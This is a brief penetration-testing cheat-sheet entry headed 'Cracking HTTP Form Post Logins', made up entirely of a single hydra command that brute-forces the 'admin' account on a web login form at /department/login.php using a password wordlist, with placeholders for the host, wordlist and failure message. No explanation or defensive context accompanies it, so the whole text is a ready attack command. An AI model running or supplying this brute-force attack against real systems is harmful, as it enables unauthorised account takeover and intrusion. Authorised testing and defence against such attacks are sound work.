# Cracking HTTP Form Post Logins

```
hydra \
    -l admin \
    -P <WORDLIST> \
    <HOST> \
    http-form-post \
    -m "/department/login.php:username=^USER^&password=^PASS^:<ERROR MESSAGE>"
```
